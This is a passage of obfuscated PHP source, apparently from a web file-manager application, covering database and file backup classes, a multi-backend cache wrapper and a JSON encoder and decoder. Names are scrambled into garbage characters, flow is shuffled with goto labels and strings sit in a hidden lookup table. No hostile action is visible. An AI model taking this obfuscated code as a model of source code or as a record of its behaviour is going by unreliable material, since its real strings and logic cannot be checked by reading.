$f¿ë„Éµ»—(); } $fâ½Éİ°¶© = $_SERVER[ºÖÙÂŒäÉê‡][177]; goto Aµè‘ì³¢˜; f°·àÄ¿: } goto a†‹®º´ÛÒ; D°ÚÕçì: class BackupDbFile { public function __construct() { } public function index() { goto a—°ƒ¦à“ù; eëèá¿Ú±ö: $BøË¶®ŒÛˆ = new TaskFileTransfer($bíµó½ßÑ[728], $bíµó½ßÑ[711], 0, LNG($bíµó½ßÑ[712]) . $bíµó½ßÑ[416] . LNG($bíµó½ßÑ[714]) . $bíµó½ßÑ[729]); $BøË¶®ŒÛˆ->addPath($d‰ŞæºÍô); $E×åùÆäªË = IO::infoWithChildren($d‰ŞæºÍô); goto AÑ¥¹™Û; C§¾ã£œÛØ: return !0; goto a·ª…—¡¥; aºô‰Á½ò¤: IO::copy($BìíŸ°Éïí, $A£íÆã±´… . "\142\x61\143\153\x75\x70\137{$BÀÓ÷ÂØ²ô}\x2f"); $BøË¶®ŒÛˆ->end(); Backup::set(array($bíµó½ßÑ[732] => $E×åùÆäªË[$bíµó½ßÑ[77]])); goto C§¾ã£œÛØ; AÑ¥¹™Û: Backup::set(array($bíµó½ßÑ[730] => $E×åùÆäªË[$bíµó½ßÑ[77]])); IO::move($d‰ŞæºÍô, $A£íÆã±´…); $BìíŸ°Éïí = CONTROLLER_DIR . $bíµó½ßÑ[731]; goto aºô‰Á½ò¤; a—°ƒ¦à“ù: $bíµó½ßÑ =& $_SERVER[ºÖÙÂŒäÉê‡]; $FÏ¤°‡‡â’ = Backup::get(); $BÀÓ÷ÂØ²ô = $FÏ¤°‡‡â’[$bíµó½ßÑ[28]]; goto Dß¨óîî‚¤; Dß¨óîî‚¤: $d‰ŞæºÍô = TEMP_FILES . "\142\x61\x63\153\165\160\x5f{$BÀÓ÷ÂØ²ô}\57"; $A£íÆã±´… = "\x7b\x69\x6f\72{$FÏ¤°‡‡â’[$bíµó½ßÑ[688]]}\x7d\57\144\141\164\141\x62\x61\163\145\57"; IO::mkdir($A£íÆã±´… . "\x62\x61\143\153\x75\x70\x5f{$BÀÓ÷ÂØ²ô}\x2f"); goto eëèá¿Ú±ö; a·ª…—¡¥: } } class BackupFile { public function __construct() { } public function index() { goto aŞğÄ™³ï; EËŸõØ—«°: $dìÌ‰Î‹·Ñ = (int) Model($_SERVER[ºÖÙÂŒäÉê‡][718])->where($bª’›â§Æ)->count($_SERVER[ºÖÙÂŒäÉê‡][423]); $C¢Õé¯éòÌ = (int) Model($_SERVER[ºÖÙÂŒäÉê‡][718])->where($bª’›â§Æ)->sum($_SERVER[ºÖÙÂŒäÉê‡][77]); $d³¤Ö»ø = new TaskFileTransfer($_SERVER[ºÖÙÂŒäÉê‡][735], $_SERVER[ºÖÙÂŒäÉê‡][711], $dìÌ‰Î‹·Ñ, LNG($_SERVER[ºÖÙÂŒäÉê‡][712]) . $_SERVER[ºÖÙÂŒäÉê‡][713] . LNG($_SERVER[ºÖÙÂŒäÉê‡][736])); goto F¬çÌŞÙé¢; a¬™ïÕ™¨º: $b—Óã¢Ï† = $D­óŒºè‰ ? 1 : 0; $câƒÈéø©„ = array($_SERVER[ºÖÙÂŒäÉê‡][749] => 1, $_SERVER[ºÖÙÂŒäÉê‡][700] => time(), $_SERVER[ºÖÙÂŒäÉê‡][706] => $b—Óã¢Ï†, $_SERVER[ºÖÙÂŒäÉê‡][746] => $C±ÇÜå‹‘ï, $_SERVER[ºÖÙÂŒäÉê‡][738] => $C¢Õé¯éòÌ, $_SERVER[ºÖÙÂŒäÉê‡][737] => $dìÌ‰Î‹·Ñ); if ($eÊ‚ˆ°ôõ¥) { $câƒÈéø©„[$_SERVER[ºÖÙÂŒäÉê‡][747]] = $aĞœ«‘Úª°; $câƒÈéø©„[$_SERVER[ºÖÙÂŒäÉê‡][748]] = $AğàÈ·¾—¤; } goto AèÒóÍ¢–; F¬çÌŞÙé¢: $d³¤Ö»ø->task[$_SERVER[ºÖÙÂŒäÉê‡][695]] = $C¢Õé¯éòÌ; $câƒÈéø©„ = array($_SERVER[ºÖÙÂŒäÉê‡][737] => $dìÌ‰Î‹·Ñ, $_SERVER[ºÖÙÂŒäÉê‡][738] => $C¢Õé¯éòÌ); Backup::set($câƒÈéø©„); goto D¡œ¶ØÙñ‰; bÃ´óø™¡Ë: $fëˆ“°Ó‰Ï = 1000; $e‰ÂÄ«é¸ = $eÊ‚ˆ°ôõ¥ = 0; $C‰ï¤¥åÄ = array(); goto FãÎ×Ãñ«; AèÒóÍ¢–: Backup::set($câƒÈéø©„); $this->_fileFilter($C‰ï¤¥åÄ); return !0; goto b¾­™è‘° ; D¡œ¶ØÙñ‰: $D­óŒºè‰ = !0; $fÑº“´ÅŠ§ = $this->storeIds(); $aëëˆ¼§ÓÚ = 1; goto bÃ´óø™¡Ë; aŞğÄ™³ï: $e¥ÓÒ¦œº· = Backup::get(); $C±ÇÜå‹‘ï = $e¥ÓÒ¦œº·[$_SERVER[ºÖÙÂŒäÉê‡][286]][$_SERVER[ºÖÙÂŒäÉê‡][163]][$_SERVER[ºÖÙÂŒäÉê‡][423]]; $bª’›â§Æ = array($_SERVER[ºÖÙÂŒäÉê‡][424] => array($_SERVER[ºÖÙÂŒäÉê‡][733], $C±ÇÜå‹‘ï), $_SERVER[ºÖÙÂŒäÉê‡][734] => array($_SERVER[ºÖÙÂŒäÉê‡][324], $e¥ÓÒ¦œº·[$_SERVER[ºÖÙÂŒäÉê‡][688]])); goto EËŸõØ—«°; FãÎ×Ãñ«: $AğàÈ·¾—¤ = $aĞœ«‘Úª° = 0; do { $Aà‡‹òÄªÉ = $_SERVER[ºÖÙÂŒäÉê‡][739]; $Bí¾Ÿ¬§¢— = Model($_SERVER[ºÖÙÂŒäÉê‡][718])->where($bª’›â§Æ)->field($Aà‡‹òÄªÉ)->order($_SERVER[ºÖÙÂŒäÉê‡][740])->selectPage($fëˆ“°Ó‰Ï, $aëëˆ¼§ÓÚ); $eº¤Ú‹Úù = !empty($Bí¾Ÿ¬§¢—[$_SERVER[ºÖÙÂŒäÉê‡][359]]) ? $Bí¾Ÿ¬§¢—[$_SERVER[ºÖÙÂŒäÉê‡][359]] : array(); foreach ($eº¤Ú‹Úù as $F³Ô¥áŒŞ) { goto a—›£™—Èˆ; Bó‘ ôïœÛ: if ($e‰ÂÄ«é¸ >= 1024 * 1024 * 100) { $câƒÈéø©„ = array($_SERVER[ºÖÙÂŒäÉê‡][746] => $C±ÇÜå‹‘ï, $_SERVER[ºÖÙÂŒäÉê‡][747] => $aĞœ«‘Úª°, $_SERVER[ºÖÙÂŒäÉê‡][748] => $AğàÈ·¾—¤); Backup::set($câƒÈéø©„); $e‰ÂÄ«é¸ = $eÊ‚ˆ°ôõ¥ = 0; } goto bƒï‡ÀÉë¹; a—›£™—Èˆ: if (!$this->_fileExist($F³Ô¥áŒŞ, $C‰ï¤¥åÄ, $fÑº“´ÅŠ§)) { $dìÌ‰Î‹·Ñ -= 1; $C¢Õé¯éòÌ -= (int) $F³Ô¥áŒŞ[$_SERVER[ºÖÙÂŒäÉê‡][77]]; write_log("\x66\151\x6c\x65\40\x6e\157\164\40\x65\x78\x69\163\164\x2e\x66\151\154\145\x49\x44\x3a{$F³Ô¥áŒŞ[$_SERVER[ºÖÙÂŒäÉê‡][423]]}\54\40\160\x61\164\150\x3a{$F³Ô¥áŒŞ[$_SERVER[ºÖÙÂŒäÉê‡][75]]}", $_SERVER[ºÖÙÂŒäÉê‡][741]); continue; } $båƒ—‡©íµ = $F³Ô¥áŒŞ[$_SERVER[ºÖÙÂŒäÉê‡][75]]; $aó– •˜²ì = "\x7b\151\x6f\72{$e¥ÓÒ¦œº·[$_SERVER[ºÖÙÂŒäÉê‡][688]]}\x7d" . substr($båƒ—‡©íµ, strlen("\x7b\x69\x6f\72{$F³Ô¥áŒŞ[$_SERVER[ºÖÙÂŒäÉê‡][742]]}\175")); goto bĞ§—İÓŒ; fŠÊ„ÃÔĞ‚: $e‰ÂÄ«é¸ += $F³Ô¥áŒŞ[$_SERVER[ºÖÙÂŒäÉê‡][77]]; $aĞœ«‘Úª° += 1; $AğàÈ·¾—¤ += $F³Ô¥áŒŞ[$_SERVER[ºÖÙÂŒäÉê‡][77]]; goto Bó‘ ôïœÛ; bĞ§—İÓŒ: if (IO::exist($aó– •˜²ì)) { $d³¤Ö»ø->updateFileEnd($F³Ô¥áŒŞ[$_SERVER[ºÖÙÂŒäÉê‡][28]], $F³Ô¥áŒŞ[$_SERVER[ºÖÙÂŒäÉê‡][77]]); } else { $aó– •˜²ì = get_path_father($aó– •˜²ì); IO::mkdir($aó– •˜²ì); if (!IO::copy($båƒ—‡©íµ, $aó– •˜²ì, $_SERVER[ºÖÙÂŒäÉê‡][743])) { write_log($_SERVER[ºÖÙÂŒäÉê‡][744] . $båƒ—‡©íµ . $_SERVER[ºÖÙÂŒäÉê‡][745] . $aó– •˜²ì . $_SERVER[ºÖÙÂŒäÉê‡][480], $_SERVER[ºÖÙÂŒäÉê‡][711]); $D­óŒºè‰ = !1; break; } } $C±ÇÜå‹‘ï = $F³Ô¥áŒŞ[$_SERVER[ºÖÙÂŒäÉê‡][423]]; $eÊ‚ˆ°ôõ¥ += 1; goto fŠÊ„ÃÔĞ‚; bƒï‡ÀÉë¹: } $A‰åÊØ¢¥ = count($eº¤Ú‹Úù); $aëëˆ¼§ÓÚ++; } while ($A‰åÊØ¢¥ == $fëˆ“°Ó‰Ï); $d³¤Ö»ø->end(); goto a¬™ïÕ™¨º; b¾­™è‘° : } private function _fileExist($e¼•àî÷°, &$c•¾÷××Õ, $CâÛÔœ›—) { goto C¦ªõĞñ ; d³šõíÀÎ‘: if (IO::exist($DÆÜ¸•Ğ¶)) { $c•¾÷××Õ[] = $e¼•àî÷°[$cØŠ²—Á›£[423]]; return !1; } $Aãè¡êê‰ = array($cØŠ²—Á›£[742] => $e¼•àî÷°[$cØŠ²—Á›£[742]], $cØŠ²—Á›£[75] => array($cØŠ²—Á›£[750], "{$DÆÜ¸•Ğ¶}\x25")); $Däßƒòµê÷ = Model($cØŠ²—Á›£[718])->where($Aãè¡êê‰)->field($cØŠ²—Á›£[424])->select(); goto Dâë›ìë›; F³ù¿´á‘: if (!in_array($e¼•àî÷°[$cØŠ²—Á›£[742]], $CâÛÔœ›—)) { return !1; } if (IO::exist($bŸ“ôªË‡ã)) { return !0; } $DÆÜ¸•Ğ¶ = get_path_father($bŸ“ôªË‡ã); goto d³šõíÀÎ‘; C¦ªõĞñ : $cØŠ²—Á›£ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bŸ“ôªË‡ã = $e¼•àî÷°[$cØŠ²—Á›£[75]]; if (in_array($e¼•àî÷°[$cØŠ²—Á›£[423]], $c•¾÷××Õ)) { return !1; } goto F³ù¿´á‘; Dâë›ìë›: $c•¾÷××Õ = array_merge($c•¾÷××Õ, array_to_keyvalue($Däßƒòµê÷, $cØŠ²—Á›£[33], $cØŠ²—Á›£[423])); return !1; goto f†ÏŠƒ‘é­; f†ÏŠƒ‘é­: } private function _fileFilter($FÖˆšØ”Î) { $A°óŠÅ è² =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($FÖˆšØ”Î)) { return; } $Càˆ„šŞõ = array($A°óŠÅ è²[423] => array($A°óŠÅ è²[7], array_unique($FÖˆšØ”Î))); $F›ÅÒ¼Ö— = Model($A°óŠÅ è²[751])->where($Càˆ„šŞõ)->field($A°óŠÅ è²[374])->select(); foreach ($F›ÅÒ¼Ö— as $fĞ÷¶éğÌ ) { Model($A°óŠÅ è²[751])->remove($fĞ÷¶éğÌ [$A°óŠÅ è²[374]], !1); } } private function storeIds() { $DêãóÍñé• =& $_SERVER[ºÖÙÂŒäÉê‡]; $fšÌªÉô¬ß = Model($DêãóÍñé•[701])->listData(); return array_to_keyvalue($fšÌªÉô¬ß, $DêãóÍñé•[33], $DêãóÍñé•[372]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto aëäàŠÓÒ–; aëäàŠÓÒ–: $Fá±¿‰Ì° =& $_SERVER[ºÖÙÂŒäÉê‡]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto c¼Èç„‘¬½; bÙâÃÒò…ä: switch ($b¶“¥Ú«¢[$Fá±¿‰Ì°[752]]) { case $Fá±¿‰Ì°[17]: self::$handle = Model($Fá±¿‰Ì°[754]); break; case $Fá±¿‰Ì°[755]: self::$handle = new CacheRedis($B±¢ö” †, $E³òÚÇÖ‡²); break; case $Fá±¿‰Ì°[756]: self::$handle = new CacheMemcached($B±¢ö” †, $E³òÚÇÖ‡²); break; case $Fá±¿‰Ì°[163]: self::$handle = new CacheFile($B±¢ö” †, $E³òÚÇÖ‡²); break; default: break; } return self::$handle; goto bñŞ¼á‚¬Ñ; c¼Èç„‘¬½: $b¶“¥Ú«¢ = $GLOBALS[$Fá±¿‰Ì°[6]][$Fá±¿‰Ì°[342]]; $B±¢ö” † = $b¶“¥Ú«¢[$b¶“¥Ú«¢[$Fá±¿‰Ì°[752]]]; $E³òÚÇÖ‡² = $b¶“¥Ú«¢[$Fá±¿‰Ì°[753]]; goto bÙâÃÒò…ä; bñŞ¼á‚¬Ñ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($A×œ»Âùìõ) { if (is_array($A×œ»Âùìõ) || is_object($A×œ»Âùìõ)) { $A×œ»Âùìõ = json_encode($A×œ»Âùìõ); } $A×œ»Âùìõ = rawurlencode($A×œ»Âùìõ); return KOD_SITE_ID . $_SERVER[ºÖÙÂŒäÉê‡][70] . $A×œ»Âùìõ; } public static function get($F¨ÎÉïØ¬ë) { $F–Šˆé­Ô = self::key($F¨ÎÉïØ¬ë); if (!isset(self::$memoryCache[$F–Šˆé­Ô])) { CacheLock::lock($F¨ÎÉïØ¬ë); $aÒ¦Ò™„‘ = self::init()->get($F–Šˆé­Ô); CacheLock::unlock($F¨ÎÉïØ¬ë); self::$memoryCache[$F–Šˆé­Ô] = unserialize($aÒ¦Ò™„‘); } return self::$memoryCache[$F–Šˆé­Ô]; } public static function set($A¹Šó‹×¾ß, $B¬£Íñæ‰Î, $Bé‘èì íŠ = false) { goto d­¶Œ®åóë; d­¶Œ®åóë: $C«ôƒÍóÔã = self::key($A¹Šó‹×¾ß); if (isset(self::$memoryCache[$C«ôƒÍóÔã]) && self::$memoryCache[$C«ôƒÍóÔã] === $B¬£Íñæ‰Î) { return !0; } if ($Bé‘èì íŠ === 0) { self::$memoryCache[$C«ôƒÍóÔã] = $B¬£Íñæ‰Î; return !0; } goto E‰„ù°¤œÉ; E‰„ù°¤œÉ: CacheLock::lock($A¹Šó‹×¾ß); $F©®Ä†è¯è = self::init()->set($C«ôƒÍóÔã, serialize($B¬£Íñæ‰Î), $Bé‘èì íŠ); self::$memoryCache[$C«ôƒÍóÔã] = $B¬£Íñæ‰Î; goto Aàâ¦²äÀÌ; Aàâ¦²äÀÌ: CacheLock::unlock($A¹Šó‹×¾ß); return $F©®Ä†è¯è; goto f°§ïÒëœê; f°§ïÒëœê: } public static function remove($E«ß«Ë) { goto F¤Ä–ÕŒã; bğœµä: return $EâÜ·Û‰; goto c†ë÷‰ªë; F¤Ä–ÕŒã: $A˜…˜§ø¿ = self::key($E«ß«Ë); unset(self::$memoryCache[$A˜…˜§ø¿]); self::clearTimeout(); goto bôŸ‘øÖì£; bôŸ‘øÖì£: CacheLock::lock($E«ß«Ë); $EâÜ·Û‰ = self::init()->remove($A˜…˜§ø¿); CacheLock::unlock($E«ß«Ë); goto bğœµä; c†ë÷‰ªë: } public static function clearMemory($cÑŠ¨èÕ± = false) { if ($cÑŠ¨èÕ±) { $cÑŠ¨èÕ± = self::key($cÑŠ¨èÕ±); unset(self::$memoryCache[$cÑŠ¨èÕ±]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ºÖÙÂŒäÉê‡][757])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ºÖÙÂŒäÉê‡][758])) { self::init()->clearTimeout(); } } } goto dªôŒ³Îİ¤; b¼¸ãØ³‰®: define($_SERVER[ºÖÙÂŒäÉê‡][1900], 32); class Services_JSON { function __construct($bñÑŸÃÒ¿¸ = 0) { $this->use = $bñÑŸÃÒ¿¸; } function utf162utf8($DÉ±¶´ÜÄ‡) { $eÌğÕÁİ­“ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (function_exists($eÌğÕÁİ­“[68])) { return mb_convert_encoding($DÉ±¶´ÜÄ‡, $eÌğÕÁİ­“[1552], $eÌğÕÁİ­“[1901]); } $eä‚¶­İ‚Ö = ord($DÉ±¶´ÜÄ‡[0]) << 8 | ord($DÉ±¶´ÜÄ‡[1]); switch (!0) { case (127 & $eä‚¶­İ‚Ö) == $eä‚¶­İ‚Ö: return chr(127 & $eä‚¶­İ‚Ö); case (2047 & $eä‚¶­İ‚Ö) == $eä‚¶­İ‚Ö: return chr(192 | $eä‚¶­İ‚Ö >> 6 & 31) . chr(128 | $eä‚¶­İ‚Ö & 63); case (65535 & $eä‚¶­İ‚Ö) == $eä‚¶­İ‚Ö: return chr(224 | $eä‚¶­İ‚Ö >> 12 & 15) . chr(128 | $eä‚¶­İ‚Ö >> 6 & 63) . chr(128 | $eä‚¶­İ‚Ö & 63); } return $eÌğÕÁİ­“[33]; } function utf82utf16($eÎùˆ¨í¯) { $c¬–ƒ¿çºÂ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (function_exists($c¬–ƒ¿çºÂ[68])) { return mb_convert_encoding($eÎùˆ¨í¯, $c¬–ƒ¿çºÂ[1901], $c¬–ƒ¿çºÂ[1552]); } switch (strlen($eÎùˆ¨í¯)) { case 1: return $eÎùˆ¨í¯; case 2: return chr(7 & ord($eÎùˆ¨í¯[0]) >> 2) . chr(192 & ord($eÎùˆ¨í¯[0]) << 6 | 63 & ord($eÎùˆ¨í¯[1])); case 3: return chr(240 & ord($eÎùˆ¨í¯[0]) << 4 | 15 & ord($eÎùˆ¨í¯[1]) >> 2) . chr(192 & ord($eÎùˆ¨í¯[1]) << 6 | 127 & ord($eÎùˆ¨í¯[2])); } return $c¬–ƒ¿çºÂ[33]; } function encode($dòâª„«‚Õ) { $e‚êİ›áŒ =& $_SERVER[ºÖÙÂŒäÉê‡]; switch (gettype($dòâª„«‚Õ)) { case $e‚êİ›áŒ[1563]: return $dòâª„«‚Õ ? $e‚êİ›áŒ[1562] : $e‚êİ›áŒ[1564]; case $e‚êİ›áŒ[1902]: return $e‚êİ›áŒ[99]; case $e‚êİ›áŒ[308]: return (int) $dòâª„«‚Õ; case $e‚êİ›áŒ[283]: case $e‚êİ›áŒ[282]: return (double) $dòâª„«‚Õ; case $e‚êİ›áŒ[317]: $C¹¬ª¸Šêì = $e‚êİ›áŒ[33]; $EÉÉ…¯Ö = strlen($dòâª„«‚Õ); for ($B¥‘‹¨œ• = 0; $B¥‘‹¨œ• < $EÉÉ…¯Ö; ++$B¥‘‹¨œ•) { $B ŒÍ™ˆ‚Á = ord($dòâª„«‚Õ[$B¥‘‹¨œ•]); switch (!0) { case $B ŒÍ™ˆ‚Á == 8: $C¹¬ª¸Šêì .= $e‚êİ›áŒ[1903]; break; case $B ŒÍ™ˆ‚Á == 9: $C¹¬ª¸Šêì .= $e‚êİ›áŒ[1539]; break; case $B ŒÍ™ˆ‚Á == 10: $C¹¬ª¸Šêì .= $e‚êİ›áŒ[1537]; break; case $B ŒÍ™ˆ‚Á == 12: $C¹¬ª¸Šêì .= $e‚êİ›áŒ[1904]; break; case $B ŒÍ™ˆ‚Á == 13: $C¹¬ª¸Šêì .= $e‚êİ›áŒ[1538]; break; case $B ŒÍ™ˆ‚Á == 34: case $B ŒÍ™ˆ‚Á == 47: case $B ŒÍ™ˆ‚Á == 92: $C¹¬ª¸Šêì .= $e‚êİ›áŒ[93] . $dòâª„«‚Õ[$B¥‘‹¨œ•]; break; case $B ŒÍ™ˆ‚Á >= 32 && $B ŒÍ™ˆ‚Á <= 127: $C¹¬ª¸Šêì .= $dòâª„«‚Õ[$B¥‘‹¨œ•]; break; case ($B ŒÍ™ˆ‚Á & 224) == 192: $b»öÇ‡Ä‘ = pack($e‚êİ›áŒ[1905], $B ŒÍ™ˆ‚Á, ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 1])); $B¥‘‹¨œ• += 1; $B‰¦ÂŸ‹ = $this->utf82utf16($b»öÇ‡Ä‘); $C¹¬ª¸Šêì .= sprintf($e‚êİ›áŒ[1906], bin2hex($B‰¦ÂŸ‹)); break; case ($B ŒÍ™ˆ‚Á & 240) == 224: $b»öÇ‡Ä‘ = pack($e‚êİ›áŒ[1905], $B ŒÍ™ˆ‚Á, ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 1]), ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 2])); $B¥‘‹¨œ• += 2; $B‰¦ÂŸ‹ = $this->utf82utf16($b»öÇ‡Ä‘); $C¹¬ª¸Šêì .= sprintf($e‚êİ›áŒ[1906], bin2hex($B‰¦ÂŸ‹)); break; case ($B ŒÍ™ˆ‚Á & 248) == 240: $b»öÇ‡Ä‘ = pack($e‚êİ›áŒ[1905], $B ŒÍ™ˆ‚Á, ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 1]), ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 2]), ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 3])); $B¥‘‹¨œ• += 3; $B‰¦ÂŸ‹ = $this->utf82utf16($b»öÇ‡Ä‘); $C¹¬ª¸Šêì .= sprintf($e‚êİ›áŒ[1906], bin2hex($B‰¦ÂŸ‹)); break; case ($B ŒÍ™ˆ‚Á & 252) == 248: $b»öÇ‡Ä‘ = pack($e‚êİ›áŒ[1905], $B ŒÍ™ˆ‚Á, ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 1]), ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 2]), ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 3]), ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 4])); $B¥‘‹¨œ• += 4; $B‰¦ÂŸ‹ = $this->utf82utf16($b»öÇ‡Ä‘); $C¹¬ª¸Šêì .= sprintf($e‚êİ›áŒ[1906], bin2hex($B‰¦ÂŸ‹)); break; case ($B ŒÍ™ˆ‚Á & 254) == 252: $b»öÇ‡Ä‘ = pack($e‚êİ›áŒ[1905], $B ŒÍ™ˆ‚Á, ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 1]), ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 2]), ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 3]), ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 4]), ord($dòâª„«‚Õ[$B¥‘‹¨œ• + 5])); $B¥‘‹¨œ• += 5; $B‰¦ÂŸ‹ = $this->utf82utf16($b»öÇ‡Ä‘); $C¹¬ª¸Šêì .= sprintf($e‚êİ›áŒ[1906], bin2hex($B‰¦ÂŸ‹)); break; } } return $e‚êİ›áŒ[112] . $C¹¬ª¸Šêì . $e‚êİ›áŒ[112]; case $e‚êİ›áŒ[1907]: if (is_array($dòâª„«‚Õ) && count($dòâª„«‚Õ) && array_keys($dòâª„«‚Õ) !== range(0, sizeof($dòâª„«‚Õ) - 1)) { $C‹­ÂÕ™ö™ = array_map(array($this, $e‚êİ›áŒ[1908]), array_keys($dòâª„«‚Õ), array_values($dòâª„«‚Õ)); foreach ($C‹­ÂÕ™ö™ as $dì×‚ùŒ´°) { if (Services_JSON::isError($dì×‚ùŒ´°)) { return $dì×‚ùŒ´°; } } return $e‚êİ›áŒ[1058] . join($e‚êİ›áŒ[47], $C‹­ÂÕ™ö™) . $e‚êİ›áŒ[320]; } $c¥ğÈÌÆ©² = array_map(array($this, $e‚êİ›áŒ[1909]), $dòâª„«‚Õ); foreach ($c¥ğÈÌÆ©² as $bƒÕØºÑ£†) { if (Services_JSON::isError($bƒÕØºÑ£†)) { return $bƒÕØºÑ£†; } } return $e‚êİ›áŒ[153] . join($e‚êİ›áŒ[47], $c¥ğÈÌÆ©²) . $e‚êİ›áŒ[480]; case $e‚êİ›áŒ[1910]: $CöœÔ¾ïŞ¢ = get_object_vars($dòâª„«‚Õ); $C‹­ÂÕ™ö™ = array_map(array($this, $e‚êİ›áŒ[1908]), array_keys($CöœÔ¾ïŞ¢), array_values($CöœÔ¾ïŞ¢)); foreach ($C‹­ÂÕ™ö™ as $dì×‚ùŒ´°) { if (Services_JSON::isError($dì×‚ùŒ´°)) { return $dì×‚ùŒ´°; } } return $e‚êİ›áŒ[1058] . join($e‚êİ›áŒ[47], $C‹­ÂÕ™ö™) . $e‚êİ›áŒ[320]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $e‚êİ›áŒ[99] : new Services_JSON_Error(gettype($dòâª„«‚Õ) . $e‚êİ›áŒ[1911]); } } function name_value($CåÔ°ù÷øŠ, $A’”¾ŞØ·‘) { $AÖáœÀëÌ” = $this->encode($A’”¾ŞØ·‘); if (Services_JSON::isError($AÖáœÀëÌ”)) { return $AÖáœÀëÌ”; } return $this->encode(strval($CåÔ°ù÷øŠ)) . $_SERVER[ºÖÙÂŒäÉê‡][4] . $AÖáœÀëÌ”; } function reduce_string($E ¡Ú¶é) { $FÓåæùø†¡ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E ¡Ú¶é = preg_replace(array($FÓåæùø†¡[1912], $FÓåæùø†¡[1913], $FÓåæùø†¡[1914]), $FÓåæùø†¡[33], $E ¡Ú¶é); return trim($E ¡Ú¶é); } function decode($a°¬óÍ ßÔ) { $cïê«¨‹‰È =& $_SERVER[ºÖÙÂŒäÉê‡]; $a°¬óÍ ßÔ = $this->reduce_string($a°¬óÍ ßÔ); switch (strtolower($a°¬óÍ ßÔ)) { case $cïê«¨‹‰È[1562]: return !0; case $cïê«¨‹‰È[1564]: return !1; case $cïê«¨‹‰È[99]: return null; default: $Eêá„àğ = array(); if (is_numeric($a°¬óÍ ßÔ)) { return (double) $a°¬óÍ ßÔ == (int) $a°¬óÍ ßÔ ? (int) $a°¬óÍ ßÔ : (double) $a°¬óÍ ßÔ; } elseif (preg_match($cïê«¨‹‰È[1915], $a°¬óÍ ßÔ, $Eêá„àğ) && $Eêá„àğ[1] == $Eêá„àğ[2]) { $B¦±Â˜õ™± = substr($a°¬óÍ ßÔ, 0, 1); $AŞ¨ñ°í­ˆ = substr($a°¬óÍ ßÔ, 1, -1); $fä®‡ùæ¼ = $cïê«¨‹‰È[33]; $Fç§ëÓ®Ãµ = strlen($AŞ¨ñ°í­ˆ); for ($E¨á¶·ªé× = 0; $E¨á¶·ªé× < $Fç§ëÓ®Ãµ; ++$E¨á¶·ªé×) { $c™Ø¤°«Î£ = substr($AŞ¨ñ°í­ˆ, $E¨á¶·ªé×, 2); $eæÕœğÚë° = ord($AŞ¨ñ°í­ˆ[$E¨á¶·ªé×]); switch (!0) { case $c™Ø¤°«Î£ == $cïê«¨‹‰È[1903]: $fä®‡ùæ¼ .= chr(8); ++$E¨á¶·ªé×; break; case $c™Ø¤°«Î£ == $cïê«¨‹‰È[1539]: $fä®‡ùæ¼ .= chr(9); ++$E¨á¶·ªé×; break; case $c™Ø¤°«Î£ == $cïê«¨‹‰È[1537]: $fä®‡ùæ¼ .= chr(10); ++$E¨á¶·ªé×; break; case $c™Ø¤°«Î£ == $cïê«¨‹‰È[1904]: $fä®‡ùæ¼ .= chr(12); ++$E¨á¶·ªé×; break; case $c™Ø¤°«Î£ == $cïê«¨‹‰È[1538]: $fä®‡ùæ¼ .= chr(13); ++$E¨á¶·ªé×; break; case $c™Ø¤°«Î£ == $cïê«¨‹‰È[1321]: case $c™Ø¤°«Î£ == $cïê«¨‹‰È[1916]: case $c™Ø¤°«Î£ == $cïê«¨‹‰È[1532]: case $c™Ø¤°«Î£ == $cïê«¨‹‰È[1534]: if ($B¦±Â˜õ™± == $cïê«¨‹‰È[112] && $c™Ø¤°«Î£ != $cïê«¨‹‰È[1916] || $B¦±Â˜õ™± == $cïê«¨‹‰È[55] && $c™Ø¤°«Î£ != $cïê«¨‹‰È[1321]) { $fä®‡ùæ¼ .= $AŞ¨ñ°í­ˆ[++$E¨á¶·ªé×]; } break; case preg_match($cïê«¨‹‰È[1917], substr($AŞ¨ñ°í­ˆ, $E¨á¶·ªé×, 6)): $fŒ„§ÙÃö¥ = chr(hexdec(substr($AŞ¨ñ°í­ˆ, $E¨á¶·ªé× + 2, 2))) . chr(hexdec(substr($AŞ¨ñ°í­ˆ, $E¨á¶·ªé× + 4, 2))); $fä®‡ùæ¼ .= $this->utf162utf8($fŒ„§ÙÃö¥); $E¨á¶·ªé× += 5; break; case $eæÕœğÚë° >= 32 && $eæÕœğÚë° <= 127: $fä®‡ùæ¼ .= $AŞ¨ñ°í­ˆ[$E¨á¶·ªé×]; break; case ($eæÕœğÚë° & 224) == 192: $fä®‡ùæ¼ .= substr($AŞ¨ñ°í­ˆ, $E¨á¶·ªé×, 2); ++$E¨á¶·ªé×; break; case ($eæÕœğÚë° & 240) == 224: $fä®‡ùæ¼ .= substr($AŞ¨ñ°í­ˆ, $E¨á¶·ªé×, 3); $E¨á¶·ªé× += 2; break; case ($eæÕœğÚë° & 248) == 240: $fä®‡ùæ¼ .= substr($AŞ¨ñ°í­ˆ, $E¨á¶·ªé×, 4); $E¨á¶·ªé× += 3; break; case ($eæÕœğÚë° & 252) == 248: $fä®‡ùæ¼ .= substr($AŞ¨ñ°í­ˆ, $E¨á¶·ªé×, 5); $E¨á¶·ªé× += 4; break; case ($eæÕœğÚë° & 254) == 252: 